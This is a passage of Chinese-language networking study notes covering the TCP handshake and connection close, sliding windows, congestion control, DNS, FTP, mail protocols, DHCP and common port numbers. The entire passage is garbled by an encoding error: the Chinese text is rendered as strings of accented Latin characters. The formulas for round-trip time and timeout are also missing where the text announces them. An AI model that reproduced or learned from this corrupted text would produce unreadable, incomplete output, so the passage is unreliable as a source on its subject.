æ—¶ï¼Œè¡¨ç¤ºæ­¤æŠ¥æ–‡æ®µçš„å‘é€æ–¹çš„æ•°æ®å·²å‘é€å®Œæ¯•ï¼Œå¹¶è¦æ±‚é‡Šæ”¾è¿æ¥ã€‚ çª—å£ ï¼šçª—å£å€¼ä½œä¸ºæ¥æ”¶æ–¹è®©å‘é€æ–¹è®¾ç½®å…¶å‘é€çª—å£çš„ä¾æ®ã€‚ä¹‹æ‰€ä»¥è¦æœ‰è¿™ä¸ªé™åˆ¶ï¼Œæ˜¯å› ä¸ºæ¥æ”¶æ–¹çš„æ•°æ®ç¼“å­˜ç©ºé—´æ˜¯æœ‰é™çš„ã€‚ TCP çš„ä¸‰æ¬¡æ¡æ‰‹ å‡è®¾ A ä¸ºå®¢æˆ·ç«¯ï¼ŒB ä¸ºæœåŠ¡å™¨ç«¯ã€‚ é¦–å…ˆ B å¤„äº LISTENï¼ˆç›‘å¬ï¼‰çŠ¶æ€ï¼Œç­‰å¾…å®¢æˆ·çš„è¿æ¥è¯·æ±‚ã€‚ A å‘ B å‘é€è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼ŒSYN=1ï¼ŒACK=0ï¼Œé€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºå· xã€‚ B æ”¶åˆ°è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µï¼Œå¦‚æœåŒæ„å»ºç«‹è¿æ¥ï¼Œåˆ™å‘ A å‘é€è¿æ¥ç¡®è®¤æŠ¥æ–‡æ®µï¼ŒSYN=1ï¼ŒACK=1ï¼Œç¡®è®¤å·ä¸º x+1ï¼ŒåŒæ—¶ä¹Ÿé€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºå· yã€‚ A æ”¶åˆ° B çš„è¿æ¥ç¡®è®¤æŠ¥æ–‡æ®µåï¼Œè¿˜è¦å‘ B å‘å‡ºç¡®è®¤ï¼Œç¡®è®¤å·ä¸º y+1ï¼Œåºå·ä¸º x+1ã€‚ B æ”¶åˆ° A çš„ç¡®è®¤åï¼Œè¿æ¥å»ºç«‹ã€‚ ä¸‰æ¬¡æ¡æ‰‹çš„åŸå›  ç¬¬ä¸‰æ¬¡æ¡æ‰‹æ˜¯ä¸ºäº†é˜²æ­¢å¤±æ•ˆçš„è¿æ¥è¯·æ±‚åˆ°è¾¾æœåŠ¡å™¨ï¼Œè®©æœåŠ¡å™¨é”™è¯¯æ‰“å¼€è¿æ¥ã€‚ å¤±æ•ˆçš„è¿æ¥è¯·æ±‚æ˜¯æŒ‡ï¼Œå®¢æˆ·ç«¯å‘é€çš„è¿æ¥è¯·æ±‚åœ¨ç½‘ç»œä¸­æ»ç•™ï¼Œå®¢æˆ·ç«¯å› ä¸ºæ²¡åŠæ—¶æ”¶åˆ°æœåŠ¡å™¨ç«¯å‘é€çš„è¿æ¥ç¡®è®¤ï¼Œå› æ­¤å°±é‡æ–°å‘é€äº†è¿æ¥è¯·æ±‚ã€‚æ»ç•™çš„è¿æ¥è¯·æ±‚å¹¶ä¸æ˜¯ä¸¢å¤±ï¼Œä¹‹åè¿˜æ˜¯ä¼šåˆ°è¾¾æœåŠ¡å™¨ã€‚å¦‚æœä¸è¿›è¡Œç¬¬ä¸‰æ¬¡æ¡æ‰‹ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¼šè¯¯è®¤ä¸ºå®¢æˆ·ç«¯é‡æ–°è¯·æ±‚è¿æ¥ï¼Œç„¶åæ‰“å¼€äº†è¿æ¥ã€‚ä½†æ˜¯å¹¶ä¸æ˜¯å®¢æˆ·ç«¯çœŸæ­£æ‰“å¼€è¿™ä¸ªè¿æ¥ï¼Œå› æ­¤å®¢æˆ·ç«¯ä¸ä¼šç»™æœåŠ¡å™¨å‘é€æ•°æ®ï¼Œè¿™ä¸ªè¿æ¥å°±ç™½ç™½æµªè´¹äº†ã€‚ TCP çš„å››æ¬¡æŒ¥æ‰‹ ä»¥ä¸‹æè¿°ä¸è®¨è®ºåºå·å’Œç¡®è®¤å·ï¼Œå› ä¸ºåºå·å’Œç¡®è®¤å·çš„è§„åˆ™æ¯”è¾ƒç®€å•ã€‚å¹¶ä¸”ä¸è®¨è®º ACKï¼Œå› ä¸º ACK åœ¨è¿æ¥å»ºç«‹ä¹‹åéƒ½ä¸º 1ã€‚ A å‘é€è¿æ¥é‡Šæ”¾æŠ¥æ–‡æ®µï¼ŒFIN=1ã€‚ B æ”¶åˆ°ä¹‹åå‘å‡ºç¡®è®¤ï¼Œæ­¤æ—¶ TCP å±äºåŠå…³é—­çŠ¶æ€ï¼ŒB èƒ½å‘ A å‘é€æ•°æ®ä½†æ˜¯ A ä¸èƒ½å‘ B å‘é€æ•°æ®ã€‚ å½“ B ä¸å†éœ€è¦è¿æ¥æ—¶ï¼Œå‘é€è¿æ¥é‡Šæ”¾è¯·æ±‚æŠ¥æ–‡æ®µï¼ŒFIN=1ã€‚ A æ”¶åˆ°åå‘å‡ºç¡®è®¤ï¼Œè¿›å…¥ TIME-WAIT çŠ¶æ€ï¼Œç­‰å¾… 2 MSL æ—¶é—´åé‡Šæ”¾è¿æ¥ã€‚ B æ”¶åˆ° A çš„ç¡®è®¤åé‡Šæ”¾è¿æ¥ã€‚ å››æ¬¡æŒ¥æ‰‹çš„åŸå›  å®¢æˆ·ç«¯å‘é€äº† FIN è¿æ¥é‡Šæ”¾æŠ¥æ–‡ä¹‹åï¼ŒæœåŠ¡å™¨æ”¶åˆ°äº†è¿™ä¸ªæŠ¥æ–‡ï¼Œå°±è¿›å…¥äº† CLOSE-WAIT çŠ¶æ€ã€‚è¿™ä¸ªçŠ¶æ€æ˜¯ä¸ºäº†è®©æœåŠ¡å™¨ç«¯å‘é€è¿˜æœªä¼ é€å®Œæ¯•çš„æ•°æ®ï¼Œä¼ é€å®Œæ¯•ä¹‹åï¼ŒæœåŠ¡å™¨ä¼šå‘é€ FIN è¿æ¥é‡Šæ”¾æŠ¥æ–‡ã€‚ TIME_WAIT å®¢æˆ·ç«¯æ¥æ”¶åˆ°æœåŠ¡å™¨ç«¯çš„ FIN æŠ¥æ–‡åè¿›å…¥æ­¤çŠ¶æ€ï¼Œæ­¤æ—¶å¹¶ä¸æ˜¯ç›´æ¥è¿›å…¥ CLOSED çŠ¶æ€ï¼Œè¿˜éœ€è¦ç­‰å¾…ä¸€ä¸ªæ—¶é—´è®¡æ—¶å™¨è®¾ç½®çš„æ—¶é—´ 2MSLã€‚è¿™ä¹ˆåšæœ‰ä¸¤ä¸ªç†ç”±ï¼š ç¡®ä¿æœ€åä¸€ä¸ªç¡®è®¤æŠ¥æ–‡æ®µèƒ½å¤Ÿåˆ°è¾¾ã€‚å¦‚æœ B æ²¡æ”¶åˆ° A å‘é€æ¥çš„ç¡®è®¤æŠ¥æ–‡æ®µï¼Œé‚£ä¹ˆå°±ä¼šé‡æ–°å‘é€è¿æ¥é‡Šæ”¾è¯·æ±‚æŠ¥æ–‡æ®µï¼ŒA ç­‰å¾…ä¸€æ®µæ—¶é—´å°±æ˜¯ä¸ºäº†å¤„ç†è¿™ç§æƒ…å†µçš„å‘ç”Ÿã€‚ ç­‰å¾…ä¸€æ®µæ—¶é—´æ˜¯ä¸ºäº†è®©æœ¬è¿æ¥æŒç»­æ—¶é—´å†…æ‰€äº§ç”Ÿçš„æ‰€æœ‰æŠ¥æ–‡æ®µéƒ½ä»ç½‘ç»œä¸­æ¶ˆå¤±ï¼Œä½¿å¾—ä¸‹ä¸€ä¸ªæ–°çš„è¿æ¥ä¸ä¼šå‡ºç°æ—§çš„è¿æ¥è¯·æ±‚æŠ¥æ–‡æ®µã€‚ TCP æ»‘åŠ¨çª—å£ çª—å£æ˜¯ç¼“å­˜çš„ä¸€éƒ¨åˆ†ï¼Œç”¨æ¥æš‚æ—¶å­˜æ”¾å­—èŠ‚æµã€‚å‘é€æ–¹å’Œæ¥æ”¶æ–¹å„æœ‰ä¸€ä¸ªçª—å£ï¼Œæ¥æ”¶æ–¹é€šè¿‡ TCP æŠ¥æ–‡æ®µä¸­çš„çª—å£å­—æ®µå‘Šè¯‰å‘é€æ–¹è‡ªå·±çš„çª—å£å¤§å°ï¼Œå‘é€æ–¹æ ¹æ®è¿™ä¸ªå€¼å’Œå…¶å®ƒä¿¡æ¯è®¾ç½®è‡ªå·±çš„çª—å£å¤§å°ã€‚ å‘é€çª—å£å†…çš„å­—èŠ‚éƒ½å…è®¸è¢«å‘é€ï¼Œæ¥æ”¶çª—å£å†…çš„å­—èŠ‚éƒ½å…è®¸è¢«æ¥æ”¶ã€‚å¦‚æœå‘é€çª—å£å·¦éƒ¨çš„å­—èŠ‚å·²ç»å‘é€å¹¶ä¸”æ”¶åˆ°äº†ç¡®è®¤ï¼Œé‚£ä¹ˆå°±å°†å‘é€çª—å£å‘å³æ»‘åŠ¨ä¸€å®šè·ç¦»ï¼Œç›´åˆ°å·¦éƒ¨ç¬¬ä¸€ä¸ªå­—èŠ‚ä¸æ˜¯å·²å‘é€å¹¶ä¸”å·²ç¡®è®¤çš„çŠ¶æ€ï¼›æ¥æ”¶çª—å£çš„æ»‘åŠ¨ç±»ä¼¼ï¼Œæ¥æ”¶çª—å£å·¦éƒ¨å­—èŠ‚å·²ç»å‘é€ç¡®è®¤å¹¶äº¤ä»˜ä¸»æœºï¼Œå°±å‘å³æ»‘åŠ¨æ¥æ”¶çª—å£ã€‚ æ¥æ”¶çª—å£åªä¼šå¯¹çª—å£å†…æœ€åä¸€ä¸ªæŒ‰åºåˆ°è¾¾çš„å­—èŠ‚è¿›è¡Œç¡®è®¤ï¼Œä¾‹å¦‚æ¥æ”¶çª—å£å·²ç»æ”¶åˆ°çš„å­—èŠ‚ä¸º {31, 34, 35}ï¼Œå…¶ä¸­ {31} æŒ‰åºåˆ°è¾¾ï¼Œè€Œ {32, 33} å°±ä¸æ˜¯ï¼Œå› æ­¤åªå¯¹å­—èŠ‚ 31 è¿›è¡Œç¡®è®¤ã€‚å‘é€æ–¹å¾—åˆ°ä¸€ä¸ªå­—èŠ‚çš„ç¡®è®¤ä¹‹åï¼Œå°±çŸ¥é“è¿™ä¸ªå­—èŠ‚ä¹‹å‰çš„æ‰€æœ‰å­—èŠ‚éƒ½å·²ç»è¢«æ¥æ”¶ã€‚ TCP å¯é ä¼ è¾“TCP ä½¿ç”¨è¶…æ—¶é‡ä¼ æ¥å®ç°å¯é ä¼ è¾“ï¼šå¦‚æœä¸€ä¸ªå·²ç»å‘é€çš„æŠ¥æ–‡æ®µåœ¨è¶…æ—¶æ—¶é—´å†…æ²¡æœ‰æ”¶åˆ°ç¡®è®¤ï¼Œé‚£ä¹ˆå°±é‡ä¼ è¿™ä¸ªæŠ¥æ–‡æ®µã€‚ ä¸€ä¸ªæŠ¥æ–‡æ®µä»å‘é€å†åˆ°æ¥æ”¶åˆ°ç¡®è®¤æ‰€ç»è¿‡çš„æ—¶é—´ç§°ä¸ºå¾€è¿”æ—¶é—´ RTTï¼ŒåŠ æƒå¹³å‡å¾€è¿”æ—¶é—´ RTTs è®¡ç®—å¦‚ä¸‹ï¼š è¶…æ—¶æ—¶é—´ RTO åº”è¯¥ç•¥å¤§äº RTTsï¼ŒTCP ä½¿ç”¨çš„è¶…æ—¶æ—¶é—´è®¡ç®—å¦‚ä¸‹ï¼š å…¶ä¸­ RTTd ä¸ºåå·®ã€‚ TCP æµé‡æ§åˆ¶æµé‡æ§åˆ¶æ˜¯ä¸ºäº†æ§åˆ¶å‘é€æ–¹å‘é€é€Ÿç‡ï¼Œä¿è¯æ¥æ”¶æ–¹æ¥å¾—åŠæ¥æ”¶ã€‚ æ¥æ”¶æ–¹å‘é€çš„ç¡®è®¤æŠ¥æ–‡ä¸­çš„çª—å£å­—æ®µå¯ä»¥ç”¨æ¥æ§åˆ¶å‘é€æ–¹çª—å£å¤§å°ï¼Œä»è€Œå½±å“å‘é€æ–¹çš„å‘é€é€Ÿç‡ã€‚å°†çª—å£å­—æ®µè®¾ç½®ä¸º 0ï¼Œåˆ™å‘é€æ–¹ä¸èƒ½å‘é€æ•°æ®ã€‚ TCP æ‹¥å¡æ§åˆ¶å¦‚æœç½‘ç»œå‡ºç°æ‹¥å¡ï¼Œåˆ†ç»„å°†ä¼šä¸¢å¤±ï¼Œæ­¤æ—¶å‘é€æ–¹ä¼šç»§ç»­é‡ä¼ ï¼Œä»è€Œå¯¼è‡´ç½‘ç»œæ‹¥å¡ç¨‹åº¦æ›´é«˜ã€‚å› æ­¤å½“å‡ºç°æ‹¥å¡æ—¶ï¼Œåº”å½“æ§åˆ¶å‘é€æ–¹çš„é€Ÿç‡ã€‚è¿™ä¸€ç‚¹å’Œæµé‡æ§åˆ¶å¾ˆåƒï¼Œä½†æ˜¯å‡ºå‘ç‚¹ä¸åŒã€‚æµé‡æ§åˆ¶æ˜¯ä¸ºäº†è®©æ¥æ”¶æ–¹èƒ½æ¥å¾—åŠæ¥å—ï¼Œè€Œæ‹¥å¡æ§åˆ¶æ˜¯ä¸ºäº†é™ä½æ•´ä¸ªç½‘ç»œçš„æ‹¥å¡ç¨‹åº¦ã€‚ TCP ä¸»è¦é€šè¿‡å››ç§ç®—æ³•æ¥è¿›è¡Œæ‹¥å¡æ§åˆ¶ï¼šæ…¢å¼€å§‹ã€æ‹¥å¡é¿å…ã€å¿«é‡ä¼ ã€å¿«æ¢å¤ã€‚ å‘é€æ–¹éœ€è¦ç»´æŠ¤ä¸€ä¸ªå«åšæ‹¥å¡çª—å£ï¼ˆcwndï¼‰çš„çŠ¶æ€å˜é‡ï¼Œæ³¨æ„æ‹¥å¡çª—å£ä¸å‘é€æ–¹çª—å£çš„åŒºåˆ«ï¼šæ‹¥å¡çª—å£åªæ˜¯ä¸€ä¸ªçŠ¶æ€å˜é‡ï¼Œå®é™…å†³å®šå‘é€æ–¹èƒ½å‘é€å¤šå°‘æ•°æ®çš„æ˜¯å‘é€æ–¹çª—å£ã€‚ ä¸ºäº†ä¾¿äºè®¨è®ºï¼Œåšå¦‚ä¸‹å‡è®¾ï¼š æ¥æ”¶æ–¹æœ‰è¶³å¤Ÿå¤§çš„æ¥æ”¶ç¼“å­˜ï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿæµé‡æ§åˆ¶ï¼› è™½ç„¶ TCP çš„çª—å£åŸºäºå­—èŠ‚ï¼Œä½†æ˜¯è¿™é‡Œè®¾çª—å£çš„å¤§å°å•ä½ä¸ºæŠ¥æ–‡æ®µã€‚ 1. æ…¢å¼€å§‹ä¸æ‹¥å¡é¿å…å‘é€çš„æœ€åˆæ‰§è¡Œæ…¢å¼€å§‹ï¼Œä»¤ cwnd=1ï¼Œå‘é€æ–¹åªèƒ½å‘é€ 1 ä¸ªæŠ¥æ–‡æ®µï¼›å½“æ”¶åˆ°ç¡®è®¤åï¼Œå°† cwnd åŠ å€ï¼Œå› æ­¤ä¹‹åå‘é€æ–¹èƒ½å¤Ÿå‘é€çš„æŠ¥æ–‡æ®µæ•°é‡ä¸ºï¼š2ã€4ã€8 â€¦ æ³¨æ„åˆ°æ…¢å¼€å§‹æ¯ä¸ªè½®æ¬¡éƒ½å°† cwnd åŠ å€ï¼Œè¿™æ ·ä¼šè®© cwnd å¢é•¿é€Ÿåº¦éå¸¸å¿«ï¼Œä»è€Œä½¿å¾—å‘é€æ–¹å‘é€çš„é€Ÿåº¦å¢é•¿é€Ÿåº¦è¿‡å¿«ï¼Œç½‘ç»œæ‹¥å¡çš„å¯èƒ½ä¹Ÿå°±æ›´é«˜ã€‚è®¾ç½®ä¸€ä¸ªæ…¢å¼€å§‹é—¨é™ ssthreshï¼Œå½“ cwnd &gt;= ssthresh æ—¶ï¼Œè¿›å…¥æ‹¥å¡é¿å…ï¼Œæ¯ä¸ªè½®æ¬¡åªå°† cwnd åŠ  1ã€‚ å¦‚æœå‡ºç°äº†è¶…æ—¶ï¼Œåˆ™ä»¤ ssthresh = cwnd/2ï¼Œç„¶åé‡æ–°æ‰§è¡Œæ…¢å¼€å§‹ã€‚ 2. å¿«é‡ä¼ ä¸å¿«æ¢å¤åœ¨æ¥æ”¶æ–¹ï¼Œè¦æ±‚æ¯æ¬¡æ¥æ”¶åˆ°æŠ¥æ–‡æ®µéƒ½åº”è¯¥å‘é€å¯¹å·²æ”¶åˆ°æœ‰åºæŠ¥æ–‡æ®µçš„ç¡®è®¤ï¼Œä¾‹å¦‚å·²ç»æ¥æ”¶åˆ° M1 å’Œ M2ï¼Œæ­¤æ—¶æ”¶åˆ° M4ï¼Œåº”å½“å‘é€å¯¹ M2 çš„ç¡®è®¤ã€‚ åœ¨å‘é€æ–¹ï¼Œå¦‚æœæ”¶åˆ°ä¸‰ä¸ªé‡å¤ç¡®è®¤ï¼Œé‚£ä¹ˆå¯ä»¥ç¡®è®¤ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µä¸¢å¤±ï¼Œä¾‹å¦‚æ”¶åˆ°ä¸‰ä¸ª M2 ï¼Œåˆ™ M3 ä¸¢å¤±ã€‚æ­¤æ—¶æ‰§è¡Œå¿«é‡ä¼ ï¼Œç«‹å³é‡ä¼ ä¸‹ä¸€ä¸ªæŠ¥æ–‡æ®µã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåªæ˜¯ä¸¢å¤±ä¸ªåˆ«æŠ¥æ–‡æ®µï¼Œè€Œä¸æ˜¯ç½‘ç»œæ‹¥å¡ï¼Œå› æ­¤æ‰§è¡Œå¿«æ¢å¤ï¼Œä»¤ ssthresh = cwnd/2 ï¼Œcwnd = ssthreshï¼Œæ³¨æ„åˆ°æ­¤æ—¶ç›´æ¥è¿›å…¥æ‹¥å¡é¿å…ã€‚æ…¢å¼€å§‹å’Œå¿«æ¢å¤çš„å¿«æ…¢æŒ‡çš„æ˜¯ cwnd çš„è®¾å®šå€¼ï¼Œè€Œä¸æ˜¯ cwnd çš„å¢é•¿é€Ÿç‡ã€‚æ…¢å¼€å§‹ cwnd è®¾å®šä¸º 1ï¼Œè€Œå¿«æ¢å¤ cwnd è®¾å®šä¸º ssthreshã€‚ å…­ã€åº”ç”¨å±‚åŸŸåç³»ç»ŸDNS æ˜¯ä¸€ä¸ªåˆ†å¸ƒå¼æ•°æ®åº“ï¼Œæä¾›äº†ä¸»æœºåå’Œ IP åœ°å€ä¹‹é—´çš„è½¬æ¢ã€‚è¿™é‡Œçš„åˆ†å¸ƒå¼æ•°æ®åº“æ˜¯æŒ‡ï¼Œæ¯ä¸ªç«™ç‚¹åªä¿ç•™å®ƒè‡ªå·±çš„é‚£éƒ¨åˆ†æ•°æ®ã€‚ åŸŸåå…·æœ‰å±‚æ¬¡ç»“æ„ï¼Œä»ä¸Šåˆ°ä¸‹ä¾æ¬¡ä¸ºï¼šæ ¹åŸŸåã€é¡¶çº§åŸŸåã€ç¬¬äºŒçº§åŸŸåã€‚ DNS å¯ä»¥ä½¿ç”¨ UDP æˆ–è€… TCP è¿›è¡Œä¼ è¾“ï¼Œä½¿ç”¨çš„ç«¯å£å·éƒ½ä¸º 53ã€‚å¤§å¤šæ•°æƒ…å†µä¸‹ DNS ä½¿ç”¨ UDP è¿›è¡Œä¼ è¾“ï¼Œè¿™å°±è¦æ±‚åŸŸåè§£æå™¨å’ŒåŸŸåæœåŠ¡å™¨éƒ½å¿…é¡»è‡ªå·±å¤„ç†è¶…æ—¶å’Œé‡ä¼ æ¥ä¿è¯å¯é æ€§ã€‚åœ¨ä¸¤ç§æƒ…å†µä¸‹ä¼šä½¿ç”¨ TCP è¿›è¡Œä¼ è¾“ï¼š å› ä¸º UDP æœ€å¤§åªæ”¯æŒ 512 å­—èŠ‚çš„æ•°æ®ï¼Œå¦‚æœè¿”å›çš„å“åº”è¶…è¿‡çš„ 512 å­—èŠ‚å°±æ”¹ç”¨ TCP è¿›è¡Œä¼ è¾“ã€‚ åŒºåŸŸä¼ é€æ˜¯ä¸»åŸŸåæœåŠ¡å™¨å‘è¾…åŠ©åŸŸåæœåŠ¡å™¨ä¼ é€å˜åŒ–çš„é‚£éƒ¨åˆ†æ•°æ®ï¼ŒåŒºåŸŸä¼ é€éœ€è¦ä½¿ç”¨ TCP è¿›è¡Œä¼ è¾“ã€‚ æ–‡ä»¶ä¼ é€åè®®FTP ä½¿ç”¨ TCP è¿›è¡Œè¿æ¥ï¼Œå®ƒéœ€è¦ä¸¤ä¸ªè¿æ¥æ¥ä¼ é€ä¸€ä¸ªæ–‡ä»¶ï¼š æ§åˆ¶è¿æ¥ï¼šæœåŠ¡å™¨ä»¥æ‰“å¼€ç«¯å£å· 21 ç­‰å¾…å®¢æˆ·ç«¯çš„è¿æ¥ï¼Œå®¢æˆ·ç«¯ä¸»åŠ¨å»ºç«‹è¿æ¥åï¼Œä½¿ç”¨è¿™ä¸ªè¿æ¥å°†å®¢æˆ·ç«¯çš„å‘½ä»¤ä¼ é€ç»™æœåŠ¡å™¨ï¼Œå¹¶ä¼ å›æœåŠ¡å™¨çš„åº”ç­”ã€‚ æ•°æ®è¿æ¥ï¼šç”¨æ¥ä¼ é€ä¸€ä¸ªæ–‡ä»¶ã€‚ æ ¹æ®æ•°æ®è¿æ¥æ˜¯å¦æ˜¯æœåŠ¡å™¨ç«¯ä¸»åŠ¨å»ºç«‹ï¼ŒFTP æœ‰ä¸»åŠ¨å’Œè¢«åŠ¨ä¸¤ç§æ¨¡å¼ï¼š ä¸»åŠ¨æ¨¡å¼ï¼šæœåŠ¡å™¨ç«¯ä¸»åŠ¨å»ºç«‹æ•°æ®è¿æ¥ï¼Œå…¶ä¸­æœåŠ¡å™¨ç«¯çš„ç«¯å£å·ä¸º 20ï¼Œå®¢æˆ·ç«¯çš„ç«¯å£å·éšæœºï¼Œä½†æ˜¯å¿…é¡»å¤§äº 1024ï¼Œå› ä¸º 0~1023 æ˜¯ç†ŸçŸ¥ç«¯å£å·ã€‚ è¢«åŠ¨æ¨¡å¼ï¼šå®¢æˆ·ç«¯ä¸»åŠ¨å»ºç«‹æ•°æ®è¿æ¥ï¼Œå…¶ä¸­å®¢æˆ·ç«¯çš„ç«¯å£å·ç”±å®¢æˆ·ç«¯è‡ªå·±æŒ‡å®šï¼ŒæœåŠ¡å™¨ç«¯çš„ç«¯å£å·éšæœºã€‚ ä¸»åŠ¨æ¨¡å¼è¦æ±‚å®¢æˆ·ç«¯å¼€æ”¾ç«¯å£å·ç»™æœåŠ¡å™¨ç«¯ï¼Œéœ€è¦å»é…ç½®å®¢æˆ·ç«¯çš„é˜²ç«å¢™ã€‚è¢«åŠ¨æ¨¡å¼åªéœ€è¦æœåŠ¡å™¨ç«¯å¼€æ”¾ç«¯å£å·å³å¯ï¼Œæ— éœ€å®¢æˆ·ç«¯é…ç½®é˜²ç«å¢™ã€‚ä½†æ˜¯è¢«åŠ¨æ¨¡å¼ä¼šå¯¼è‡´æœåŠ¡å™¨ç«¯çš„å®‰å…¨æ€§å‡å¼±ï¼Œå› ä¸ºå¼€æ”¾äº†è¿‡å¤šçš„ç«¯å£å·ã€‚ è¿œç¨‹ç™»å½•åè®®TELNET ç”¨äºç™»å½•åˆ°è¿œç¨‹ä¸»æœºä¸Šï¼Œå¹¶ä¸”è¿œç¨‹ä¸»æœºä¸Šçš„è¾“å‡ºä¹Ÿä¼šè¿”å›ã€‚ TELNET å¯ä»¥é€‚åº”è®¸å¤šè®¡ç®—æœºå’Œæ“ä½œç³»ç»Ÿçš„å·®å¼‚ï¼Œä¾‹å¦‚ä¸åŒæ“ä½œç³»ç»Ÿç³»ç»Ÿçš„æ¢è¡Œç¬¦å®šä¹‰ã€‚ ç”µå­é‚®ä»¶åè®®ä¸€ä¸ªç”µå­é‚®ä»¶ç³»ç»Ÿç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šç”¨æˆ·ä»£ç†ã€é‚®ä»¶æœåŠ¡å™¨ä»¥åŠé‚®ä»¶åè®®ã€‚ é‚®ä»¶åè®®åŒ…å«å‘é€åè®®å’Œè¯»å–åè®®ï¼Œå‘é€åè®®å¸¸ç”¨ SMTPï¼Œè¯»å–åè®®å¸¸ç”¨ POP3 å’Œ IMAPã€‚ 1. POP3POP3 çš„ç‰¹ç‚¹æ˜¯åªè¦ç”¨æˆ·ä»æœåŠ¡å™¨ä¸Šè¯»å–äº†é‚®ä»¶ï¼Œå°±æŠŠè¯¥é‚®ä»¶åˆ é™¤ã€‚ 2. IMAPIMAP åè®®ä¸­å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ä¸Šçš„é‚®ä»¶ä¿æŒåŒæ­¥ï¼Œå¦‚æœä¸å»æ‰‹åŠ¨åˆ é™¤é‚®ä»¶ï¼Œé‚£ä¹ˆæœåŠ¡å™¨ä¸Šçš„é‚®ä»¶ä¹Ÿä¸ä¼šè¢«åˆ é™¤ã€‚IMAP è¿™ç§åšæ³•å¯ä»¥è®©ç”¨æˆ·éšæ—¶éšåœ°å»è®¿é—®æœåŠ¡å™¨ä¸Šçš„é‚®ä»¶ã€‚ 3. SMTPSMTP åªèƒ½å‘é€ ASCII ç ï¼Œè€Œäº’è”ç½‘é‚®ä»¶æ‰©å…… MIME å¯ä»¥å‘é€äºŒè¿›åˆ¶æ–‡ä»¶ã€‚MIME å¹¶æ²¡æœ‰æ”¹åŠ¨æˆ–è€…å–ä»£ SMTPï¼Œè€Œæ˜¯å¢åŠ é‚®ä»¶ä¸»ä½“çš„ç»“æ„ï¼Œå®šä¹‰äº†é ASCII ç çš„ç¼–ç è§„åˆ™ã€‚ åŠ¨æ€ä¸»æœºé…ç½®åè®®DHCP (Dynamic Host Configuration Protocol) æä¾›äº†å³æ’å³ç”¨çš„è¿ç½‘æ–¹å¼ï¼Œç”¨æˆ·ä¸å†éœ€è¦å»æ‰‹åŠ¨é…ç½® IP åœ°å€ç­‰ä¿¡æ¯ã€‚DHCP é…ç½®çš„å†…å®¹ä¸ä»…æ˜¯ IP åœ°å€ï¼Œè¿˜åŒ…æ‹¬å­ç½‘æ©ç ã€ç½‘å…³ IP åœ°å€ã€‚ DHCP å·¥ä½œè¿‡ç¨‹å¦‚ä¸‹ï¼š å®¢æˆ·ç«¯å‘é€ Discover æŠ¥æ–‡ï¼Œè¯¥æŠ¥æ–‡çš„ç›®çš„åœ°å€ä¸º 255.255.255.255:67ï¼Œæºåœ°å€ä¸º 0.0.0.0:68ï¼Œè¢«æ”¾å…¥ UDP ä¸­ï¼Œè¯¥æŠ¥æ–‡è¢«å¹¿æ’­åˆ°åŒä¸€ä¸ªå­ç½‘çš„æ‰€æœ‰ä¸»æœºä¸Šã€‚ DHCP æœåŠ¡å™¨æ”¶åˆ° Discover æŠ¥æ–‡ä¹‹åï¼Œå‘é€ Offer æŠ¥æ–‡ç»™å®¢æˆ·ç«¯ï¼Œè¯¥æŠ¥æ–‡åŒ…å«äº†å®¢æˆ·ç«¯æ‰€éœ€è¦çš„ä¿¡æ¯ã€‚å› ä¸ºå®¢æˆ·ç«¯å¯èƒ½æ”¶åˆ°å¤šä¸ª DHCP æœåŠ¡å™¨æä¾›çš„ä¿¡æ¯ï¼Œå› æ­¤å®¢æˆ·ç«¯éœ€è¦è¿›è¡Œé€‰æ‹©ã€‚ å¦‚æœå®¢æˆ·ç«¯é€‰æ‹©äº†æŸä¸ª DHCP æœåŠ¡å™¨æä¾›çš„ä¿¡æ¯ï¼Œé‚£ä¹ˆå°±å‘é€ Request æŠ¥æ–‡ç»™è¯¥ DHCP æœåŠ¡å™¨ã€‚ DHCP æœåŠ¡å™¨å‘é€ Ack æŠ¥æ–‡ï¼Œè¡¨ç¤ºå®¢æˆ·ç«¯æ­¤æ—¶å¯ä»¥ä½¿ç”¨æä¾›ç»™å®ƒçš„ä¿¡æ¯ã€‚ å¦‚æœå®¢æˆ·ç«¯å’Œ DHCP æœåŠ¡å™¨ä¸åœ¨åŒä¸€ä¸ªå­ç½‘ï¼Œå°±éœ€è¦ä½¿ç”¨ä¸­ç»§ä»£ç†ã€‚ å¸¸ç”¨ç«¯å£ åº”ç”¨ åº”ç”¨å±‚åè®® ç«¯å£å· è¿è¾“å±‚åè®® å¤‡æ³¨ åŸŸåè§£æ DNS 53 UDP/TCP é•¿åº¦è¶…è¿‡ 512 å­—èŠ‚æ—¶ä½¿ç”¨ TCP åŠ¨æ€ä¸»æœºé…ç½®åè®® DHCP 67/68 UDP ç®€å•ç½‘ç»œç®¡ç†åè®® SNMP 161/162 UDP æ–‡ä»¶ä¼ é€åè®® FTP 20/21 TCP æ§åˆ¶è¿æ¥ 21ï¼Œæ•°æ®è¿æ¥ 20 è¿œç¨‹ç»ˆç«¯åè®® TELNET 23 TCP è¶…æ–‡æœ¬ä¼ é€åè®® HTTP 80 TCP ç®€å•é‚®ä»¶ä¼ é€åè®® SMTP 25 TCP é‚®ä»¶è¯»å–åè®® POP3 110 TCP ç½‘é™…æŠ¥æ–‡å­˜å–åè®® IMAP 143 TCP Web é¡µé¢è¯·æ±‚è¿‡ç¨‹1. DHCP é…ç½®ä¸»æœºä¿¡æ¯ å‡è®¾ä¸»æœºæœ€å¼€å§‹æ²¡æœ‰ IP åœ°å€ä»¥åŠå…¶å®ƒä¿¡æ¯ï¼Œé‚£ä¹ˆå°±éœ€è¦å…ˆä½¿ç”¨ DHCP æ¥è·å–ã€‚ ä¸»æœºç”Ÿæˆä¸€ä¸ª DHCP è¯·æ±‚æŠ¥æ–‡ï¼Œå¹¶å°†è¿™ä¸ªæŠ¥æ–‡æ”¾å…¥å…·æœ‰ç›®çš„ç«¯å£ 67 å’Œæºç«¯å£ 68 çš„ UDP æŠ¥æ–‡æ®µä¸­ã€‚ 